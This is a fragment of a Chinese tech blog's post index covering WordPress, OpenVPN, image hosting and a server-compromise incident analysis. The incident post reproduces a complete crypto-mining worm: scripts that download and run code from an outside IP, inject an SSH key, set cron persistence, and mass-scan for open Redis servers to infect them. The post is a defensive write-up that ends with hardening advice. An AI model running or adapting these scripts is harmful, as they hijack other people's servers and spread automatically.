wordpress搭配redis加速网站访问速度\n搭配jsdelivr-CDN实现全站cdn WordPress+jsDelivr开启伪全站CDN\n参考 从能用到好用-快速搭建高性能WordPress指南\n","permalink":"https://www.lvbibir.cn/posts/blog/wordpress_to_docker/","summary":"前言 前段时间着手开始搭建自己的wordpress博客，刚开始图方便直接买了阿里云的轻量应用服务器，它是一套预先搭建好的lamp架构，并已经做","title":"wordpress迁移到docker"},{"content":"周一早上刚到办公室，就听到同事说有一台服务器登陆不上了，我也没放在心上，继续边吃早点，边看币价是不是又跌了。不一会运维的同事也到了，气喘吁吁的说：我们有台服务器被阿里云冻结了，理由：对外恶意发包。我放下酸菜馅的包子，ssh连了一下，被拒绝了，问了下默认的22端口被封了。让运维的同事把端口改了一下，立马连上去，顺便看了一下登录名:root，还有不足8位的小白密码，心里一凉：被黑了！\n服务器系统CentOS 6.X，部署了nginx，tomcat，redis等应用，上来先把数据库全备份到本地，然后top命令看了一下，有2个99%的同名进程还在运行，叫gpg-agentd。\ngoogle了一下gpg，结果是：\nGPG提供的gpg-agent提供了对SSH协议的支持，这个功能可以大大简化密钥的管理工作。\n看起来像是一个很正经的程序嘛，但仔细再看看服务器上的进程后面还跟着一个字母d，伪装的很好，让人想起来windows上各种看起来像svchost.exe的病毒。继续\nps eho command -p 23374netstat -pan | grep 23374 查看pid:23374进程启动路径和网络状况，也就是来到了图1的目录，到此已经找到了黑客留下的二进制可执行文件。接下来还有2个问题在等着我：\n1、文件是怎么上传的？ 2、这个文件的目的是什么，或是黑客想干嘛？\nhistory看一下，记录果然都被清掉了，没留下任何痕迹。继续命令more messages，\n看到了在半夜12点左右，在服务器上装了很多软件，其中有几个软件引起了我的注意，下面详细讲。边找边猜，如果我们要做坏事，大概会在哪里做文章，自动启动？定时启动？对，计划任务。\ncrontab -e 果然，线索找到了。\n上面的计划任务的意思就是每15分钟去服务器上下载一个脚本，并且执行这个脚本。我们把脚本下载下来看一下。\ncurl -fsSL 159.89.190.243/ash.php \u0026gt; ash.sh 脚本内容如下：\nuname -aidhostnamesetenforce 0 2\u0026gt;/dev/nullulimit -n 50000ulimit -u 50000crontab -r 2\u0026gt;/dev/nullrm -rf /var/spool/cron/* 2\u0026gt;/dev/nullmkdir -p /var/spool/cron/crontabs 2\u0026gt;/dev/nullmkdir -p /root/.ssh 2\u0026gt;/dev/nullecho \u0026#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDfB19N9slQ6uMNY8dVZmTQAQhrdhlMsXVJeUD4AIH2tbg6Xk5PmwOpTeO5FhWRO11dh3inlvxxX5RRa/oKCWk0NNKmMza8YGLBiJsq/zsZYv6H6Haf51FCbTXf6lKt9g4LGoZkpNdhLIwPwDpB/B7nZqQYdTmbpEoCn6oHFYeimMEOqtQPo/szA9pX0RlOHgq7Duuu1ZjR68fTHpgc2qBSG37Sg2aTUR4CRzD4Li5fFXauvKplIim02pEY2zKCLtiYteHc0wph/xBj8wGKpHFP0xMbSNdZ/cmLMZ5S14XFSVSjCzIa0+xigBIrdgo2p5nBtrpYZ2/GN3+ThY+PNUqx redisX\u0026#39; \u0026gt; /root/.ssh/authorized_keysecho \u0026#39;*/15 * * * * curl -fsSL 159.89.190.243/ash.php|sh\u0026#39; \u0026gt; /var/spool/cron/rootecho \u0026#39;*/20 * * * * curl -fsSL 159.89.190.243/ash.php|sh\u0026#39; \u0026gt; /var/spool/cron/crontabs/rootyum install -y bash 2\u0026gt;/dev/nullapt install -y bash 2\u0026gt;/dev/nullapt-get install -y bash 2\u0026gt;/dev/nullbash -c \u0026#39;curl -fsSL 159.89.190.243/bsh.php|bash\u0026#39; 2\u0026gt;/dev/null 大致分析一下该脚本的主要用途：\n首先是关闭SELinux，解除shell资源访问限制，然后在/root/.ssh/authorized_keys文件中生成ssh公钥，这样每次黑客登录这台服务器就可以免密码登录了，执行脚本就会方便很多，关于ssh keys的文章可以参考这一篇文章SSH原理与运用。接下来安装bash，最后是继续下载第二个脚本bsh.php，并且执行。\n继续下载并分析bsh.pbp，内容如下：\nsleep $( seq 3 7 | sort -R | head -n1 )cd /tmp || cd /var/tmpsleep 1mkdir -p .ICE-unix/... \u0026amp;\u0026amp; chmod -R 777 .ICE-unix \u0026amp;\u0026amp; cd .ICE-unix/...sleep 1if [ -f .watch ]; thenrm -rf .watchexit 0fisleep 1echo 1 \u0026gt; .watchsleep 1ps x | awk \u0026#39;!/awk/ \u0026amp;\u0026amp; /redisscan|ebscan|redis-cli/ {print $1}\u0026#39; | xargs kill -9 2\u0026gt;/dev/nullps x | awk \u0026#39;!/awk/ \u0026amp;\u0026amp; /barad_agent|masscan|.sr0|clay|udevs|.sshd|xig/ {print $1}\u0026#39; | xargs kill -9 2\u0026gt;/dev/nullsleep 1if ! [ -x /usr/bin/gpg-agentd ]; thencurl -s -o /usr/bin/gpg-agentd 159.89.190.243/dump.dbecho \u0026#39;/usr/bin/gpg-agentd\u0026#39; \u0026gt; /etc/rc.localecho \u0026#39;curl -fsSL 159.89.190.243/ash.php|sh\u0026#39; \u0026gt;\u0026gt; /etc/rc.localecho \u0026#39;exit 0\u0026#39; \u0026gt;\u0026gt; /etc/rc.localfisleep 1chmod +x /usr/bin/gpg-agentd \u0026amp;\u0026amp; /usr/bin/gpg-agentd || rm -rf /usr/bin/gpg-agentdsleep 1if ! [ -x \u0026#34;$(command -v masscan)\u0026#34; ]; thenrm -rf /var/lib/apt/lists/*rm -rf x1.tar.gzif [ -x \u0026#34;$(command -v apt-get)\u0026#34; ]; thenexport DEBIAN_FRONTEND=noninteractiveapt-get update -yapt-get install -y debconf-docapt-get install -y build-essentialapt-get install -y libpcap0.8-dev libpcap0.8apt-get install -y libpcap*apt-get install -y make gcc gitapt-get install -y redis-serverapt-get install -y redis-toolsapt-get install -y redisapt-get install -y iptablesapt-get install -y wget curlfiif [ -x \u0026#34;$(command -v yum)\u0026#34; ]; thenyum update -yyum install -y epel-releaseyum update -yyum install -y git iptables make gcc redis libpcap libpcap-develyum install -y wget curlfisleep 1curl -sL -o x1.tar.gz https://github.com/robertdavidgraham/masscan/archive/1.0.4.tar.gzsleep 1[ -f x1.tar.gz ] \u0026amp;\u0026amp; tar zxf x1.tar.gz \u0026amp;\u0026amp; cd masscan-1.0.4 \u0026amp;\u0026amp; make \u0026amp;\u0026amp; make install \u0026amp;\u0026amp; cd .. \u0026amp;\u0026amp; rm -rf masscan-1.0.4fisleep 3 \u0026amp;\u0026amp; rm -rf .watchbash -c \u0026#39;curl -fsSL 159.89.190.243/rsh.php|bash\u0026#39; 2\u0026gt;/dev/null 这段脚本的代码比较长，但主要的功能有4个：\n\\1. 下载远程代码到本地，添加执行权限，chmod u+x。 \\2. 修改rc.local，让本地代码开机自动执行。 \\3. 下载github上的开源扫描器代码，并安装相关的依赖软件，也就是我上面的messages里看到的记录。 \\4. 下载第三个脚本，并且执行。\n我去github上看了下这个开源代码，简直吊炸天。\nMASSCAN: Mass IP port scanner This is the fastest Internet port scanner. It can scan the entire Internet in under 6 minutes, \u0026gt; transmitting 10 million packets per second. It produces results similar to nmap, the most famous port scanner. Internally, it operates more \u0026gt; like scanrand, unicornscan, and ZMap, using asynchronous transmission. The major difference is \u0026gt; that it\u0026rsquo;s faster than these other scanners. In addition, it\u0026rsquo;s more flexible, allowing arbitrary \u0026gt; address ranges and port ranges. NOTE: masscan uses a custom TCP/IP stack. Anything other than simple port scans will cause conflict with the local TCP/IP stack. This means you need to either use the -S option to use a separate IP address, or configure your operating system to firewall the ports that masscan uses.\ntransmitting 10 million packets per second(每秒发送1000万个数据包)，比nmap速度还要快，这就不难理解为什么阿里云把服务器冻结了，大概看了下readme之后，我也没有细究，继续下载第三个脚本。\nsetenforce 0 2\u0026gt;/dev/nullulimit -n 50000ulimit -u 50000sleep 1iptables -I INPUT 1 -p tcp --dport 6379 -j DROP 2\u0026gt;/dev/nulliptables -I INPUT 1 -p tcp --dport 6379 -s 127.0.0.1 -j ACCEPT 2\u0026gt;/dev/nullsleep 1rm -rf .dat .shard .ranges .lan 2\u0026gt;/dev/nullsleep 1echo \u0026#39;config set dbfilename \u0026#34;backup.db\u0026#34;\u0026#39; \u0026gt; .datecho \u0026#39;save\u0026#39; \u0026gt;\u0026gt; .datecho \u0026#39;flushall\u0026#39; \u0026gt;\u0026gt; .datecho \u0026#39;set backup1 \u0026#34; */2 * * * * curl -fsSL http://159.89.190.243/ash.php | sh \u0026#34;\u0026#39; \u0026gt;\u0026gt; .datecho \u0026#39;set backup2 \u0026#34; */3 * * * * wget -q -O- http://159.89.190.243/ash.php | sh \u0026#34;\u0026#39; \u0026gt;\u0026gt; .datecho \u0026#39;set backup3 \u0026#34; */4 * * * * curl -fsSL http://159.89.190.243/ash.php | sh \u0026#34;\u0026#39; \u0026gt;\u0026gt; .datecho \u0026#39;set backup4 \u0026#34; */5 * * * * wget -q -O- http://159.89.190.243/ash.php | sh \u0026#34;\u0026#39; \u0026gt;\u0026gt; .datecho \u0026#39;config set dir \u0026#34;/var/spool/cron/\u0026#34;\u0026#39; \u0026gt;\u0026gt; .datecho \u0026#39;config set dbfilename \u0026#34;root\u0026#34;\u0026#39; \u0026gt;\u0026gt; .datecho \u0026#39;save\u0026#39; \u0026gt;\u0026gt; .datecho \u0026#39;config set dir \u0026#34;/var/spool/cron/crontabs\u0026#34;\u0026#39; \u0026gt;\u0026gt; .datecho \u0026#39;save\u0026#39; \u0026gt;\u0026gt; .datsleep 1masscan --max-rate 10000 -p6379,6380 --shard $( seq 1 22000 | sort -R | head -n1 )/22000 --exclude 255.255.255.255 0.0.0.0/0 2\u0026gt;/dev/null | awk \u0026#39;{print $6, substr($4, 1, length($4)-4)}\u0026#39; | sort | uniq \u0026gt; .shardsleep 1while read -r h p; docat .dat | redis-cli -h $h -p $p --raw 2\u0026gt;/dev/null 1\u0026gt;/dev/null \u0026amp;done \u0026lt; .shardsleep 1masscan --max-rate 10000 -p6379,6380 192.168.0.0/16 172.16.0.0/16 116.62.0.0/16 116.232.0.0/16 116.128.0.0/16 116.163.0.0/16 2\u0026gt;/dev/null | awk \u0026#39;{print $6, substr($4, 1, length($4)-4)}\u0026#39; | sort | uniq \u0026gt; .rangessleep 1while read -r h p; docat .dat | redis-cli -h $h -p $p --raw 2\u0026gt;/dev/null 1\u0026gt;/dev/null \u0026amp;done \u0026lt; .rangessleep 1ip a | grep -oE \u0026#39;([0-9]{1,3}.?){4}/[0-9]{2}\u0026#39; 2\u0026gt;/dev/null | sed \u0026#39;s//([0-9]{2})//16/g\u0026#39; \u0026gt; .inetsleep 1masscan --max-rate 10000 -p6379,6380 -iL .inet | awk \u0026#39;{print $6, substr($4, 1, length($4)-4)}\u0026#39; | sort | uniq \u0026gt; .lansleep 1while read -r h p; docat .dat | redis-cli -h $h -p $p --raw 2\u0026gt;/dev/null 1\u0026gt;/dev/null \u0026amp;done \u0026lt; .lansleep 60rm -rf .dat .shard .ranges .lan 2\u0026gt;/dev/null 如果说前两个脚本只是在服务器上下载执行了二进制文件，那这个脚本才真正显示病毒的威力。下面就来分析这个脚本。\n一开始的修改系统环境没什么好说的，接下来的写文件操作有点眼熟，如果用过redis的人，应该能猜到，这里是对redis进行配置。写这个配置，自然也就是利用了redis把缓存内容写入本地文件的漏洞，结果就是用本地的私钥去登陆被写入公钥的服务器了，无需密码就可以登陆，也就是我们文章最开始的/root/.ssh/authorized_keys。登录之后就开始定期执行计划任务，下载脚本。好了，配置文件准备好了，就开始利用masscan进行全网扫描redis服务器，寻找肉鸡，注意看这6379就是redis服务器的默认端口，如果你的redis的监听端口是公网IP或是0.0.0.0，并且没有密码保护，不好意思，你就中招了。\n通过依次分析这3个脚本，就能看出这个病毒的可怕之处，先是通过写入ssh public key 拿到登录权限，然后下载执行远程二进制文件，最后再通过redis漏洞复制，迅速在全网传播，以指数级速度增长。那么问题是，这台服务器是怎么中招的呢？看了下redis.conf，bind的地址是127.0.0.1，没啥问题。由此可以推断，应该是root帐号被暴力破解了，为了验证我的想法，我lastb看了一下，果然有大量的记录：\n还剩最后一个问题，这个gpg-agentd程序到底是干什么的呢？我当时的第一个反应就是矿机，因为现在数字货币太火了，加大了分布式矿机的需求，也就催生了这条灰色产业链。于是，顺手把这个gpg-agentd拖到ida中，用string搜索bitcoin,eth, mine等相关单词，最终发现了这个：\n打开 nicehash.com 看一下，一切都清晰了。\n一、服务器\n\\1. 禁用ROOT \\2. 用户名和密码尽量复杂 \\3. 修改ssh的默认22端口 \\4. 安装DenyHosts防暴力破解软件 \\5. 禁用密码登录，使用RSA公钥登录\n二、redis\n\\1. 禁用公网IP监听，包括0.0.0.0 \\2. 使用密码限制访问redis \\3. 使用较低权限帐号运行redis\n原文链接：https://mp.weixin.qq.com/s/FUv-7-1C30U-A81bDn8dbA\n","permalink":"https://www.lvbibir.cn/posts/tech/record_of_server_attacked/","summary":"周一早上刚到办公室，就听到同事说有一台服务器登陆不上了，我也没放在心上，继续边吃早点，边看币价是不是又跌了。不一会运维的同事也到了，气喘吁吁","title":"记一次服务器被入侵全过程"},{"content":"介绍 项目地址\n这个项目准备打造一个安全基线检查平台，期望能够以最简单的方式在需要进行检查的服务器上运行。能够达到这么一种效果：基线检查脚本(以后称之为agent)可以单独在目标服务器上运行，并展示出相应不符合基线的地方，并且可以将检查时搜集到的信息以json串的形式上传到后端处理服务器上，后端服务器可以进行统计并进行可视化展示。\nAgent用到的技术：\nShell脚本 Powershell脚本 后端服务器用到的技术：\npython django bootstrap html 存储所用：\nsqlite3 前端页面部署 环境 系统 centos7.8(最小化安装) 前端：192.168.150.101 client端：192.168.150.102 安装python3.6 源码包下载地址\nyum install gcc gcc-c++ zlib-devel sqlite-devel mariadb-server mariadb-devel openssl-devel tcl-devel tk-devel tree libffi-devel -y tar -xf Python-3.6.10.tgz ./configure --enable-optimizations make make install python3 -V 安装pip3+django 源码包下载地址\ntar zxvf pip-21.0.1.tar.gz cd pip-21.0.1/ python3 setup.py build python3 setup.py install pip3 install django==2.2.15 git clone项目到本地 yum install -y git git clone https://github.com/chroblert/assetmanage.git 部署server端项目 cd assetManage # 使用python3安装依赖包 python3 -m pip install -r requirements.txt python3 manage.py makemigrations python3 manage.py migrate python3 manage.py runserver 0.0.0.0:8888 # 假定该服务器的IP未112.112.112.112 访问测试：http://192.168.150.101:8888/\n客户端进行检查 将项目目录中的Agent目录copy到需要进行基线检查的客户端 scp -r assetmanage/Agent/ 192.168.150.102:/root/ cd Agent/ chmod a+x ./*.sh 修改 linux_baseline_check.sh 文件的最后一行，配置前端django项目的ip和端口 运行脚本即可，终端会有检查结果的输出，前端页面相应也会有数据 ","permalink":"https://www.lvbibir.cn/posts/tech/centos7_deploy_benchmark/","summary":"介绍 项目地址 这个项目准备打造一个安全基线检查平台，期望能够以最简单的方式在需要进行检查的服务器上运行。能够达到这么一种效果：基线检查脚本(以","title":"centos7基线检查平台部署"},{"content":" 环境：centos7.8 在centos中可以在如下文件中查看一个NIC的配置 ： /etc/sysconfig/network-scripts/ifcfg-N\nHWADDR=, 其中 以AA:BB:CC:DD:EE:FF形式的以太网设备的硬件地址.在有多个网卡设备的机器上，这个字段是非常有用的，它保证设备接口被分配了正确的设备名 ，而不考虑每个网卡模块被配置的加载顺序.这个字段不能和MACADDR一起使用.\nMACADDR=, 其中 以AA:BB:CC:DD:EE:FF形式的以太网设备的硬件地址.在有多个网卡设备的机器上.这个字段用于给一个接口分配一个MAC地址，覆盖物理分配的MAC地址 . 这个字段不能和HWADDR一起使用.\n简单总结一下：\nMACADDR是系统的网卡物理地址，因为在接收数据包时需要根据这个值来做包过滤。 HWADDR是网卡的硬件物理地址，只有厂家才能修改 可以用MACADDR来覆盖HWADDR，但这两个参数不能同时使用 ifconfig和nmcli等网络命令中显示的物理地址其实是MACADDR的值，虽然显示的名称写的是HWADDR(ether)。 修改网卡的mac地址\n#sudo vim /etc/sysconfig/network-scripts/ifcfg-ens32 注释其中的\u0026#34;HWADDR=xx:xx:xx:xx:xx:xx\u0026#34; 添加或者修改\u0026#34;MACADDR=xx:xx:xx:xx:xx:xx\u0026#34; 如果没有删除或者注释掉HWADDR，当HWADDR与MACADDR地地不同时，启动不了网络服务的提示：　“Bringing up interface eth0: Device eth0 has different MAC address than expected,ignoring.” 故正确的操作是将HWADDR删除或注释掉，改成MACADDR 查看系统初始的mac地址即HWADDR 把配置文件中的MACADDR注释或者删除掉，不用配置HWADDR，重启网络服务后用命令查看到的mac地址就是网卡的HWADDR\n参考 https://blog.csdn.net/rikeyone/article/details/108406865\nhttps://zhidao.baidu.com/question/505133906.html\nhttps://blog.csdn.net/caize340724/article/details/100958968?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-1.control\u0026amp;spm=1001.2101.3001.4242\n","permalink":"https://www.lvbibir.cn/posts/tech/hwaddr_macaddr_different/","summary":"环境：centos7.8 在centos中可以在如下文件中查看一个NIC的配置 ： /etc/sysconfig/network-scripts/ifcfg-N HWADDR=, 其中 以AA:BB:CC:DD:EE:FF形式的以太网设备的","title":"hwaddr和macaddr的区别"},{"content":"一、实验环境 3台centos6.5，1台win10，openvpn-2.4.7，easy-rsa-3.0.5\n二、拓扑结构 Win10安装openvpn-gui，三台centos6.5为vmware虚拟机，分为client、vpnserver、proxy\n三台centos6.5的eth0网卡均为内网(lan区段)地址1.1.1.0/24网段，proxy额外添加一块eth1网卡设置nat模式模拟外网ip\n三、实验目的 win10访问proxy的外网ip对应端口连接到vpnserver，分配到内网ip后可以访问到client\n四、实验思路 proxy配置ipv4转发，将访问到本机eth1网卡相对应的端口上的流量转发给vpnserver的vpn服务端口\nvpnserver为win10分配ip实现访问内网\n五、实施步骤 1.初始化环境 虚拟机安装过程 略\n配置ip client： 1.1.1.1/24\nvpnserver：1.1.1.2/24\nproxy：\t1.1.1.3/24 192.168.150.114/24\nwin10：\t192.168.150.1/24\n环境初始化（client和vpnserver关闭iptables和selinux，proxy仅关闭selinux） [root@vpnserver ~]# sed -i \u0026lsquo;/SELINUX/s/enforcing/disabled/\u0026rsquo; /etc/selinux/config [root@vpnserver ~]# setenforce 0\n2.安装vpnserver及easy-rsa vpnserver安装openvpn 由于centos6的所有官方源已失效，使用https://www.xiaofeng.org/article/2019/10/centos6buildinstallopenvpnrpm-17.html中的方法将源码编译成rpm包。\nopenvpn版本：2.4.7\n下载easy-rsa 下载地址：https://github.com/OpenVPN/easy-rsa/tree/v3.0.5\n3.创建openvpn目录，配置vars变量 解压easy-rsa目录 [root@vpnserver ~]# mkdir openvpn [root@vpnserver ~]# unzip easy-rsa-3.0.5.zip [root@vpnserver ~]# mv easy-rsa-3.0.5 easy-rsa [root@vpnserver ~]# mkdir -p /etc/openvpn [root@vpnserver ~]# cp -a easy-rsa /etc/openvpn\n配置/etc/openvpn目录 [root@vpnserver ~]# cd /etc/openvpn/easy-rsa/easyrsa3/ [root@vpnserver easyrsa3]# cp vars.example vars [root@vpnserver easyrsa3]# vim vars 添加如下变量\nset_var EASYRSA_REQ_COUNTRY \u0026#34;CN\u0026#34; set_var EASYRSA_REQ_PROVINCE \u0026#34;Beijing\u0026#34; set_var EASYRSA_REQ_CITY \u0026#34;Beijing\u0026#34; set_var EASYRSA_REQ_ORG \u0026#34;lvbibir\u0026#34; set_var EASYRSA_REQ_EMAIL \u0026#34;lvbibir@163.com\u0026#34; set_var EASYRSA_REQ_OU \u0026#34;My OpenVPN\u0026#34; 4.创建服务端证书及key 创建服务端证书及key 初始化\n[root@vpnserver ~]# cd /etc/openvpn/easy-rsa/easyrsa3/ [root@vpnserver easyrsa3]# ./easyrsa init-pki\n创建根证书\n[root@vpnserver easyrsa3]# ./easyrsa build-ca\n注意：在上述部分需要输入PEM密码 PEM pass phrase，输入两次，此密码必须记住，不然以后不能为证书签名。还需要输入common name 通用名，这个你自己随便设置个独一无二的\n创建服务器端证书\n[root@vpnserver easyrsa3]# ./easyrsa gen-req server nopass\n该过程中需要输入common name，随意但是不要跟之前的根证书的一样\n签约服务端证书\n[root@vpnserver easyrsa3]# ./easyrsa sign server server\n需要手动输入yes去人，还需要提供创建ca证书时的密码\n创建Diffie-Hellman，确保key穿越不安全网络的命令\n[root@vpnserver easyrsa3]# ./easyrsa gen-dh\n5.创建客户端证书及key 创建客户端证书 初始化\n[root@vpnserver ~]# mkdir client [root@vpnserver ~]# cd client/easy-rsa/easyrsa3/ [root@vpnserver easyrsa3]# ./easyrsa init-pki\n需输入yes确认\n创建客户端key及生成证书\n[root@vpnserver easyrsa3]# ./easyrsa gen-req zhijie.liu\n名字自己自定义，该密码是用户使用该key登录时输入的密码，可以加nopass参数在客户端登录时无需输入密码\n导入req证书\n[root@vpnserver ~]# cd /etc/openvpn/easy-rsa/easyrsa3/ [root@vpnserver easyrsa3]# ./easyrsa import-req /root/client/easy-rsa/easyrsa3/pki/reqs/zhijie.liu.req zhijie.liu\n签约证书\n[root@vpnserver easyrsa3]# ./easyrsa sign client zhijie.liu\n这里生成client，名字要与之前导入名字一致\n签约证书期间需要输入yes确认，期间需要输入CA的密码\n6.归置服务器和客户端的证书 把服务器端必要文件放到/etc/openvpn下（ca证书、服务端证书、密钥） [root@vpnserver ~]# cp /etc/openvpn/easy-rsa/easyrsa3/pki/ca.crt /etc/openvpn/ [root@vpnserver ~]# cp /etc/openvpn/easy-rsa/easyrsa3/pki/private/server.key /etc/openvpn/ [root@vpnserver ~]# cp /etc/openvpn/easy-rsa/easyrsa3/pki/issued/server.crt /etc/openvpn/ [root@vpnserver ~]# cp /etc/openvpn/easy-rsa/easyrsa3/pki/dh.pem /etc/openvpn/\n把客户端必要文件放到/root/client目录下（客户端的证书、密钥） [root@vpnserver ~]# cp /etc/openvpn/easy-rsa/easyrsa3/pki/ca.crt /root/client [root@vpnserver ~]# cp /etc/openvpn/easy-rsa/easyrsa3/pki/issued/zhijie.liu.crt /root/client/ [root@vpnserver ~]# cp /root/client/easy-rsa/easyrsa3/pki/private/zhijie.liu.key /root/client\n7.vpn服务端server.conf配置文件修改 为服务器端编写配置文件 安装好配置文件后他会提供一个server配置的文件案例，将该文件放到/etc/openvpn下\n[root@vpnserver ~]# rpm -ql openvpn | grep server.conf\n[root@vpnserver ~]# cp /usr/share/doc/openvpn-2.4.7/sample/sample-config-files/server.conf /etc/openvpn/\n修改配置文件 [root@vpnserver ~]# vim /etc/openvpn/server.conf\n[root@vpnserver ~]# grep \u0026#39;^[^#|;]\u0026#39; /etc/openvpn/server.conf local 0.0.0.0 #监听地址 port 1194 #监听端口 proto tcp #监听协议 dev tun #采用路由隧道模式 ca /etc/openvpn/ca.crt #ca证书路径 cert /etc/openvpn/server.crt #服务器证书 key /etc/openvpn/server.key # This file should be kept secret 服务器秘钥 dh /etc/openvpn/dh.pem #密钥交换协议文件 server 10.8.0.0 255.255.255.0 #给客户端分配地址池，注意：不能和VPN服务器内网网段有相同 ifconfig-pool-persist ipp.txt push \u0026#34;route 1.1.1.0 255.255.255.0\u0026#34;\t#推送内网地址 client-to-client #客户端之间互相通信 keepalive 10 120 #存活时间，10秒ping一次,120 如未收到响应则视为断线 comp-lzo #传输数据压缩 max-clients 100 #最多允许 100 客户端连接 user openvpn #用户 group openvpn #用户组 persist-key persist-tun status /var/log/openvpn/openvpn-status.log log /var/log/openvpn/openvpn.log verb 3 8.后续设置（用户、iptables和路由转发） 后续设置 [root@vpnserver ~]# mkdir /var/log/openvpn/ [root@vpnserver ~]# useradd openvpn -s /sbin/nologin [root@vpnserver ~]# chown -R openvpn.openvpn /var/log/openvpn/ [root@vpnserver ~]# chown -R openvpn.openvpn /etc/openvpn/*\niptables设置nat规则和打开路由转发 [root@vpnserver ~]# iptables -A INPUT -p tcp \u0026ndash;dport 1194 -j ACCEPT [root@vpnserver ~]# iptables -t nat -A POSTROUTING -s 10.8.0.0/24 -o eth0 -j MASQUERADE [root@vpnserver ~]# iptables -vnL -t nat\nChain PREROUTING (policy ACCEPT 0 packets, 0 bytes) pkts bytes target prot opt in out source destination Chain POSTROUTING (policy ACCEPT 0 packets, 0 bytes) pkts bytes target prot opt in out source destination 0 0 MASQUERADE all -- * * 10.8.0.0/24 0.0.0.0/0 Chain OUTPUT (policy ACCEPT 0 packets, 0 bytes) pkts bytes target prot opt in out source destination [root@vpnserver ~]# vim /etc/sysctl.conf\nnet.ipv4.ip_forward = 1 [root@vpnserver ~]# sysctl -p\n开启openvpn服务 [root@vpnserver ~]# openvpn \u0026ndash;daemon \u0026ndash;config /etc/openvpn/server.conf [root@vpnserver ~]# netstat -anput | grep 1194\nproxy开启端口转发/映射 [root@along ~]# vim /etc/sysctl.conf //打开路由转发\nnet.ipv4.ip_forward = 1 [root@proxy ~]# sysctl -p\n[root@proxy ~]# iptables -t nat -A PREROUTING -d 192.168.150.114 -p tcp \u0026ndash;dport 1194 -j DNAT \u0026ndash;to-destination 1.1.1.2:1194 [root@proxy ~]# iptables -t nat -A POSTROUTING -d 1.1.1.2 -p tcp \u0026ndash;dport 1194 -j SNAT \u0026ndash;to 1.1.1.3 [root@proxy ~]# iptables -A FORWARD -o eth0 -d 1.1.1.2 -p tcp \u0026ndash;dport 1194 -j ACCEPT [root@proxy ~]# iptables -A FORWARD -i eth0 -s 1.1.1.2 -p tcp \u0026ndash;sport 1194 -j ACCEPT\n[root@proxy ~]# iptables -A INPUT -p tcp \u0026ndash;dport 1194 -j ACCEPT\n[root@proxy ~]# service iptables save [root@proxy ~]# service iptables reload [root@proxy ~]# iptables -L -n\n六、客户段连接测试 下载openvpn客户端 略\n1.配置client端配置文件 [root@vpnserver ~]# rpm -ql openvpn | grep client.ovpn\n/usr/share/doc/openvpn-2.4.7/sample/sample-plugins/keying-material-exporter-demo/client.ovpn\n[root@vpnserver ~]# cp /usr/share/doc/openvpn-2.4.7/sample/sample-plugins/keying-material-exporter-demo/client.ovpn /root/client [root@vpnserver ~]# vim /root/client/client.ovpn\nclient dev tun proto tcp remote 192.168.150.114 1194 resolv-retry infinite nobind persist-key persist-tun ca ca.crt cert client.crt key client.key comp-lzo verb 3\n2.拷贝客户端证书及配置文件 vpnserver没装vmtools所以先将所有文件放到proxy上然后通过远程工具下载\n[root@vpnserver openvpn]# scp /root/client/ca.crt root@1.1.1.3:/root/ [root@vpnserver openvpn]# scp /root/client/zhijie.liu.crt root@1.1.1.3:/root/ [root@vpnserver openvpn]# scp /root/client/zhijie.liu.key root@1.1.1.3:/root/ [root@vpnserver openvpn]# scp /root/client/client.ovpn root@1.1.1.3:/root/\n将这四个文件放到win10的C:\\Users\\lvbibir\\OpenVPN\\config目录下\n3.ping测试 ping client的内网ip1.1.1.1\n参考：\ncentos6源码编译openvpn并打包成rpm\nhttps://www.xiaofeng.org/article/2019/10/centos6buildinstallopenvpnrpm-17.html\nopenvpn源码下载地址\nhttps://openvpn.net/community-downloads/\ncentos6搭建openvpn\nhttp://www.likecs.com/show-6021.html\ncentos6做端口映射/端口转发\nhttps://blog.csdn.net/weixin_30872499/article/details/96654741?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_baidulandingword-0\u0026amp;spm=1001.2101.3001.4242\n","permalink":"https://www.lvbibir.cn/posts/tech/centos6_deploy_openvpn/","summary":"一、实验环境 3台centos6.5，1台win10，openvpn-2.4.7，easy-rsa-3.0.5 二、拓扑结构 Win10安装ope","title":"openvpn部署"},{"content":"七牛云配置 1、注册七牛云，新建存储空间 这里就不介绍七牛云的注册和新建空间了\n七牛云新用户有10G的免费空间，作为个人博客来说基本足够了\n2、为存储空间配置加速域名 这里使用http就可，https还需要证书，有点麻烦\n3、配置域名解析 到域名厂商配置cname记录，我的域名是阿里的\n在控制台首页进入dns配置\n配置cname\nPicGo配置 下载安装 下载链接：https://github.com/Molunerfinn/PicGo/releases/\n建议下载稳定版\n配置七牛云图床 主流图床都有支持\n配置七牛图床\nak和sk在七牛云→个人中心→密钥管理中查看\ntypora测试图片上传 下载地址：https://www.typora.io/\n在文件→偏好设置→图像中配置图片上传，选择安装好的PicGo的应用程序\n点击验证图片上传\n到七牛云存储空间看是否有这两个文件\ntypora可以实现自动的图片上传，并将本地连接自动转换为外链地址\n可能的报错 报错 {“success”,false} 上传图片报错：\n看日志：\n日志路径：C:\\Users\\lvbibir\\AppData\\Roaming\\picgo\nfailed to fetch Picgo配置完七牛云图床，使用typora测试图片上传\n报错：failed to fetch\n看日志\n日志路径：C:\\Users\\lvbibir\\AppData\\Roaming\\picgo\n问题在于端口冲突，如果你打开了多个picgo程序，就会端口冲突，picgo自动帮你把36677端口改为366771端口，导致错误。log文件里也写得很清楚。\n解决\n修改picgo的监听端口\n重新验证\n","permalink":"https://www.lvbibir.cn/posts/blog/typora_picgo_qiniu_upload_image/","summary":"七牛云配置 1、注册七牛云，新建存储空间 这里就不介绍七牛云的注册和新建空间了 七牛云新用户有10G的免费空间，作为个人博客来说基本足够了 2、为存","title":"typora+picgo+七牛云上传图片"},{"content":"现象 博客加载不出来我在七牛云的图片资源 使用浏览器直接访问图片url却是可以成功的 我将之前csdn的博客迁移到了wordpress，图片外链地址就是csdn的，都可以正常加载。 使用浏览器直接访问图片url却是可以成功的\n我将之前csdn的博客迁移到了wordpress，图片外链地址就是csdn的，都可以正常加载。\n排查 1、由于浏览器直接访问七牛云图床的url地址是可以访问的，证明地址并没错，有没有可能是referer防盗链的配置问题\n查看防盗链配置，并没有开\n2、wordpress可以加载出来csdn的外链图片，期间也试了其他图床都是没问题的。\n3、看看七牛的图片外链和csdn的有何区别\n注意到七牛的图片外链是http，当时嫌麻烦并没有配置https，看来问题是出在这了\n因为我的网站配置了ssl证书，可能由于安全问题浏览器不予加载http项目，用http访问站点测试下图片是否可以加载\n访问成功了！\n解决 